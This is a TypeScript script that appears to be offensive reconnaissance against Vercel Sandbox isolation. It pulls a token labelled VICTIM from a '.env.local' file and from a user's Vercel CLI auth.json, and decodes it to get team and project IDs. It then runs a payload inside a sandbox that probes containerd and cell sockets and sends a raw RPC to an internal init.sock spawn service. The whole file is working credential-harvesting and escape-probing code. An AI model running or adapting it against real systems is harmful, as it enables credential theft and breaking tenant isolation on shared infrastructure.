import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const s = await Sandbox.get({ name: "recon2-1787252249958", token: VICTIM, teamId, projectId });
  const SCRIPT = `
set +e
echo "=== /run/cell ==="
ls -la /run/cell/ 2>/dev/null
echo "=== /run/containerd ==="
ls -la /run/containerd/ 2>/dev/null | head -15
echo "=== cell.sock type ==="
stat -c '%U %G %a %n' /run/cell/cell.sock /run/containerd/containerd.sock 2>/dev/null
echo "=== who has sockets open to init.sock (our sessions) ==="
ss -x 2>/dev/null | grep init.sock
echo "=== try connect to init.sock and HTTP ping (connectrpc unary) ==="
timeout 10 python3 -c "
import socket
S='/run/vercel/share/init.sock'
def send(d):
    s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(2); s.connect(S)
    s.sendall(d); out=b''
    try:
        while True:
            c=s.recv(4096)
            if not c: break
            out+=c
    except socket.timeout: pass
    s.close(); return out
r=send(b'POST /spawn.SpawnService/Ping HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nConnect-Protocol-Version: 1\r\nContent-Length: 2\r\n\r\n{}')
print('Ping:', repr(r[:300]))
"
echo "=== is containerd.sock accessible/writable? ==="
stat -c '%U %G %a' /run/containerd/containerd.sock 2>/dev/null
timeout 3 bash -c "exec 3<>/run/containerd/containerd.sock" 2>&1 && echo "containerd connectable" || echo "containerd no"
echo "=== DONE ==="
`;
  const r = await s.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });